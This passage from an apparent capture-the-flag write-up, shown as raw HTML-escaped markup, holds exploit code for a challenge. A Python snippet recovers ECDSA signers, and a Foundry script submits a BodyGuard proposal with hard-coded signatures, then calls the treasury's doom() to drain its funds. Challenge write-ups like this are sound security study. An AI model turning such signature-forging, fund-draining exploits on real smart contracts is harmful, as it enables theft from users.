&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;v =&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(v))
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;signature:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(r)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(s)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(v)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;signer:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ecdsa_recover&lt;&#x2F;span&gt;&lt;span&gt;(hashed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;s)))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: GPL-3.0
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.20&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script} from &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console} from &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console2} from &amp;quot;forge-std&#x2F;console2.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;CyberCartel.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Solve &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Script &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; bodyGuard &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x0fa51380834a7A7fC9799F41bd10cE18189783f4&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; treasury &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x12D49f0179cA93c34cA57916C6b30E72B2b9D398&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes constant&lt;&#x2F;span&gt;&lt;span&gt; DIGEST_SEED &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hex&amp;quot;80840397b652018080&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x09243662560a562F51aa10eE9C967FAd03663683&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hashProposal&lt;&#x2F;span&gt;&lt;span&gt;(BodyGuard.Proposal &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory &lt;&#x2F;span&gt;&lt;span&gt;proposal) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(proposal.expiredAt, proposal.gas, proposal.data, proposal.nonce, treasury, DIGEST_SEED)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;run &lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory&lt;&#x2F;span&gt;&lt;span&gt; cdata &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;gistCartelDismiss()&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        BodyGuard.Proposal &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory &lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; BodyGuard.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Proposal&lt;&#x2F;span&gt;&lt;span&gt;(type(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;, type(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint24&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;, type(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint8&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;, cdata);
&lt;&#x2F;span&gt;&lt;span&gt;        console2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;logBytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hashProposal&lt;&#x2F;span&gt;&lt;span&gt;(p));
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory&lt;&#x2F;span&gt;&lt;span&gt; signaturesSortedBySigners &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        signaturesSortedBySigners[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x23987afb25911dc6accb787901bc4e05f49b63e869deabaaac99e2273795b7f0&lt;&#x2F;span&gt;&lt;span&gt;),
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x4c9b8f0bac4d361297bc39a2d93f32b9f34febcfa450004ec6fe3f145cdf6ce1&lt;&#x2F;span&gt;&lt;span&gt;),
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes1&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x1b&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        console2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;logBytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(signaturesSortedBySigners[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]));
&lt;&#x2F;span&gt;&lt;span&gt;        signaturesSortedBySigners[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x04de52f5ba806bd67c698966292b3faa33a5bee386d0357c7529969ecbd0f762&lt;&#x2F;span&gt;&lt;span&gt;),
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x6b5e0371aba50013024e334fa459432d80450d58d215a30f58436c971e74faed&lt;&#x2F;span&gt;&lt;span&gt;),
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes1&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x1c&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        console2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;logBytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(signaturesSortedBySigners[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]));
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;BodyGuard&lt;&#x2F;span&gt;&lt;span&gt;(bodyGuard).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;propose&lt;&#x2F;span&gt;&lt;span&gt;(p, signaturesSortedBySigners);
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;TREASURY BALANCE&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(treasury).balance);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;CartelTreasury&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(treasury)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;doom&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;TREASURY BALANCE&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(treasury).balance);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;tonylend-no-longer-audited-by-certik&quot;&gt;Tonylend (No Longer Audited by CertiK)&lt;&#x2F;h2&gt;
&lt;p&gt;直接把withdraw删了是，repay也删了，修改的地方只有borrow的信用下界高了5%。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAA6QAAAF2CAMAAABOCKXiAAACNFBMVEUVGB4VGKhaGB4VccV+GB6f1v9arvEeIy8mL0HW4v8VGIPKroOxlR7Ww6iecR7W1sV+w&#x2F;&#x2F;K4twVldvUg&#x2F;yy4v8tOVP81IOy4vL8g6vW4tvW4vKDq&#x2F;wVGIKr&#x2F;IMVL8SD&#x2F;NMVRdnLspEVGKZ9GB3W18sgJrC0mzUcm97K4v9isvIpGB6Exf9AGB4VGELAdqtfIy8qdu6vQh4WfKP8eoBZVe7JVYKo&#x2F;GzBLR3UdcPWQh3WxbF9ZvwVGGGDncNmXh7tVUKDIy&#x2F;8ZmKcdvyvg&#x2F;keI43UZaZ+VZ6K&#x2F;HtdNzEVGEWfwCnIg9iiGRwVQozW4t8VLnqcLh6hdy92fR5dGB2iZqs8wnY8GB6r7lkVpWmAqdkXjsXWg6XUg9iCiqZA2NQVXtiGL0F1wl4ed8lVnfxd2INmq&#x2F;zQg+4WTR7L4vImfs51dYKIpBt7rPMWjv6p10YWe&#x2F;9c9M38g54nLpj&#x2F;UmNt&#x2F;NRAivxVfR4WMx7L4v8mnuAXZoUVfVkVQMMWZvLtg6gWn&#x2F;H50xF27oPtg4wVGDEWn&#x2F;91&#x2F;LErxMiC2IJmph&#x2F;Ig&#x2F;yx4tyB7qD4qyKjfkHI1sernLodbx3T0gpyHawVpbH3JwOd&#x2F;ICwP0zOQ1rqTV7FZzafr+yvxK7Kr8NdrttaaMiD&#x2F;LGf1vF+w9ufw&#x2F;9&#x2F;dcdaHoQYGBmxqIWCGhupddexxd6BT9bXgh3Adp5+GH+rL0G2KxSiaoRZkdTQv9DALmIyGIKiNodDGF+Exd9SfVncjUF1ncOPgqRDyYVcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAgAElEQVR4nO29iXsUR5YvGiWpSqRKJRUl3YcQ2tkkxI5YJcBghDE2i23RbZrVYHMxVmPagAe3MeNtsJHH0I3xMt4aN25Pu6f7Tq8z8+775953tsjIrKxNa0o6v++TqioyIzIiMn55TpyMOMf8L1MU&#x2F;0&#x2F;xwwqFYsqhJFUoYg4lqUIRcyhJFYqYQ0mqUMQcSlKFIuZQkioUMYeSVKGIOZSkCkXMoSRVKOYJSUd+sbXia6cykcnVvd7iGv9nYlGDmTIMNDUNRyR33Gk6uXSihXVtqxpfpRL&#x2F;&#x2F;E+T1fpX&#x2F;&#x2F;dEcivmMknXrN1OHy0te4wx+1taWlog5citFue8AiQ1pnohkjSbdodpda&#x2F;neY1VhU4eLwaiSGpMx1NLC&#x2F;7qAgLjv+jC2vZucEk60NTU1LQ5&#x2F;+RCJK77+S&#x2F;NZJG0w+G7YrZiatRdJun+3WboxG78RBwKitsKSVqAjPEnafQVCpL0rZ+ZydMjutzCFPORpIc21ZihE1tBQm562pg1f&#x2F;zbCfgyApKzhZg5sseSdM0fgypxKpP1vHpjEs2eB3zMefiTeZfyABmTWHSvFySokLEuyQIVTqiHvJ7X2mBMFj&#x2F;qkvVZ&#x2F;FkIINc24MeFow6FKBl40&#x2F;P4UUvLnsdBg4X&#x2F;dPpAE6jBlqRdXEiwsEE4u2mz6do2iBJUSEqFAYehlI47cNbJpZi8rcp0PHX&#x2F;cfgMKLvGtp5aCw+uFHzaZlJyjjokg52TgQ6830ydVPdzVHgTzYUeiIr5QlJjjrwLJF37i61r1u62kjRE0iPvDre0bPLlXspLm1RjVV0ybRLN9SbxlTE5nI0GJWnz4ho4LCT9BpiYNibFE1dOTzVWQVJd0kubbOEROUACsOPPxgygJCMKcXKYpH8ADm2wkhSIObCtSkjaceEoJoULE0naNEw5mKRcWNveYVeStu3djEkddy4cxWsFZR+0HpoLHZNrbTBZL0N9Rs3kZOqDVAaS4Ozq3tYG6DOQyxupGCXp7MUkk3S7Mfv3uCRFDRfmpHuMOdSy26xZC5NUX92tXlhTfRcERcbR7vLV3SwMPBSskpPHoJyMP+uS9XXJjGHBgjjdCXhdfiINGMQ8pJAkh0kKGNxsfw1ugFOPdqGoPLl0YLMlpFuYq+5CYTgn5csObvb1ZCIp&#x2F;ux4amnHnQ10LWKVAFufavweHkvQC1nSKbiZkpwYq8k1VuEntr66F4UuXkX13VmPKSbpkVv8BcgJZ9O&#x2F;AElBy0X6ZVlxLUBSlqRM1uqLDQGSwllIUuZuNED4GVY5yYCLvJLkMEmRjpakmKnpwlGRpKTXbggXlkdSkZxUGMlcn6TwH0gqT4VX80kKbKxnkmKfQEv9j2y67mHDdz&#x2F;WZOuxb7zGKmee3rGy+C1UzHeSHrnFJiNMxnMiSMpyD&#x2F;TXYpKUEhPNoOrCVLUhT5ImmvNImidJiY2DOAt0JGkkSa10E5KyvBWSssk2VFgBkkph1l7kSFLQnYWkUZI0gwo+&#x2F;AuTVJLv3f3LDw9Z7Q0Y01SSzn5MlKRPwzw0j6Q4Ew1wFEQqTFdxyhokKdKOZ5VZV5JCQgRJ6011L8hd5jbrvfATJ2tFJSkSCj6GTdteR&#x2F;hxctfJpW17L&#x2F;gkhUknSFJWh2XmyrzqYvkbLgwSIkjKhfU8ztwm8Q0&#x2F;YV5qSRqaky5qwBbCEwwmoEGS+sn3fqj+6xhpwUGSypw04uWVYn68ghlpafn8xFZ6EQqEFZIOnQDrLlp5wZYE&#x2F;21qmKRo3fXq8ePrRQ1k1gWrEJkqw+puyvMWfwljEbRjGKo5a91dXGNHb0GAjroBVis0jTy1lBRYMcmCpGtqGpFp5Mml8HPbXuAU23Eh3TccoQILhqNwYWCw3Zyn7kphcJQoba27w84kOPG+uwCB+wabja0MklSSU60NdcnGKuwyz+8ra92tSxazeCviDV0WGDsE3pNOFCKXRe9QzEIoSWOHwIqjCYJXHOWilmopZguUpPFD4p&#x2F;&#x2F;idZo2FdO44au3Z0LUJIqFDGHklShiDmUpApFzKEkVShiDiWpQhFzKEkVivlN0tP+stkAcCFMDNynTAqefOLgm5++MtXXaN&#x2F;yLH356U+iTniRDsO3g4ULeTZYGOPYludehFLfmrwXtIrZT1Lc6jED7lNuji5ZsuSSMeuXLFlyfLUx15fQb0g4vtqcWeKknzI9L8HvXQbTd5m288dXm56+AwVJ+uan0QSKxvPFTw5zjRlWGUmD1xCSut9ckgZXJCrmt7rbtXI63aecfsF+vTl6wPS8dMmsP2XM9Z2rzHUgqDHmOtDvlDHmDFDUrN+5itJ7XtrFiWdGD7SdH90VRdL33nmFBv2xg++4Y39KSFoalZP0+Z&#x2F;+5Nhl+KL72uYgSTf+y9+vdX60ypjbnZ2&#x2F;WW3M0JXOzs4XTNuV15EaG69hqjn9wu3Ozg+NabsGR+2q7+lxnzJ0BSrokBQoCCRd75MUkxFI0rbzzF0iadt5YOr1S23nv&#x2F;2&#x2F;qyJIKnjvnVeOIUGOtbe3vwK&#x2F;29u3PGfMi+2gXSIvXjxonr98rL39oHnz0&#x2F;Z2OkzgZDkbimhvR+Yw+DnAiU8+gdcAEsKBNz+louCSUMrzeNReA5LxzBc+hU8pDJLdSxjzKim8WXe+oZjlJL3W+XrbtQ&#x2F;NJ79ZbW5&#x2F;tMqc&#x2F;gDJKSQFFiNJOz+Aw0NXXjBwtjywp8V9Stu1D5wKOyRtOw&#x2F;SlNhoJadIUlSBhaTEy&#x2F;U7&#x2F;35+1&#x2F;UDRUj65pbnUHIdI+q99w4R4NhPfwJJlqTtl83zcEZQykkyn11YkqLMe++dg&#x2F;BMsCTFiwPDL2PGJy+bwDWOPYs5nnxiy3PwKYW9eBmT89fjK0nnFEk&#x2F;RDaeBjF55XWkZBRJP1oF3zaizP3ADoXpcJ+y8Zqv6zJJb47uwjkp8BDnpLvySApzV0xCkt7EtDNA0jOnipD02GUc&#x2F;E8+QUYkZAnw4RVfIwaSCq9CJKVkObsESeHsCJLiP84YvgbXDp8C9O3JJ&#x2F;IeFarvzkV1F4c0armdnYVJSkT5BM&#x2F;6wG7Gmg73KbdRvw4ajnYZmJMiMQtIUpDAYCUKSNJTbed3tf3ltYIkFWq9+SmziYY&#x2F;8qECkj47GSR9EdRc&#x2F;xqo9zJJMQm&#x2F;kTYcqEXQVaFiTpH0Q&#x2F;9nEZLK5DAoSafUfUqUuouMI&#x2F;4xSc8E56T+qaE56S6z&#x2F;lFBksqYFzYxQVA2PvlEJZIU&#x2F;02EpKAvO9d48omDjiSF&#x2F;ERSf0YsUEk6Z0lqbqN9CCecILrkM0TSNlE9ZU46Le5T8g1HRFLXcNR2fucq17qLp1hJil&#x2F;PHF8NJO1JQQnVvRHvgpAQIEbxdQZTA2Z+MMsE7r5ijrU7JBWJ6+eGZD7bCuJokuJlwHAEk0x8+YKMk2tAXnwnQ9eA5Dc&#x2F;dZVxFthBq5EzJ1U&#x2F;DnOPpGDdBSvvJ52dHwAj+RNSwb4r70DAugtWXt7WPF3uU0KvYISk8CpG3pO2nXffk+L7UXgpI+9J6S0qStTrUEJdMsL8iaIPDTGgbKJA9K27MPtrb7&#x2F;sSlKw1DrWXUnms0OmVzDXtm95Fq23kAymYFSK29tfeYKNwVuew2scAwtRe&#x2F;tl5xrw&#x2F;wUgKVWMC7O24DzrLpj0FHP4PalDiRLvSWcx4uCNBGeukwvRdsENt2KekzTkXHa2IR7eSCafpLziKNGsHI0VZoikvJxBESuS6trdeEJ3wSgUMYeSVKGIOZSkCkXMoSRVKGIOJalCEXMoSRWKmENJqlDEHEpShSLmUJIqFDGHklShiDmUpApFzKEkVShiDiWpQhFzKEkViphDSapQxBxKUoUi5lCSKhQxh5JUoYg5lKQKRcyhJFUoYg4lqUIRcyhJFYqYQ0mqUMQcSlKFIuZQkioU84SkI7&#x2F;YaiYbiebIaA5+clR0JobEU6zuxdhPpa4kcRSnH0XaUE7Ojvffp9gQ4wXEl+x4&#x2F;&#x2F;1gXNJPyolCMKtweja3aGpIumbtdvpoadljjNnf0tLSAilHbrWUJrNlTGUkdcJ7B35JNLayLjk+1CUrCZ4SrNBESVpR6Cu+GMat4w7iILAuST&#x2F;5YOMLn&#x2F;hRXSk8K4aWWwLxzyEC3c5VFHh5&#x2F;c5VnIwB6TCQ5JklpyhMHSZILohQd4qC0kmBiDNLlkCcOghzxxehuLAYzo5K8c9eLxfBa9BVINIsXotO37kKY+PZgLOh8H9czC6bma5FETDnl7rLJN2&#x2F;2wyd2I2fiENlidvyGRMXklbfHU3PJpJK6NcCJIXIlU5MV59TyMu286fwT0jK&#x2F;yCw681RGOzX93+DjJBQr3gYAr1irMnRSwGSrgfS&#x2F;mWVkBTOXQ+RYCVu7K5A&#x2F;YXKfI2el04Zc2aXXzMo+5Q5Q4W4GW87grTt&#x2F;COMOnsd6A05Lpmbo8HrxAwTI+mhTTVm6MRWkJCbnjZmzR&#x2F;&#x2F;dgK+jIDkbCFmjuyxJF3zxwBHE2Nfet0ggyAwKUQFXlxjqnvTljEpTAXJiYFIJZppKBnCk3oQV5ijmnJhucZRj4JsEico1mkhJBbd60XRAjKmHkZuCj7rkvVZjH1KyUT8VEYKq154v5lyZarvwiGoClyTS6EPJAaEJh97B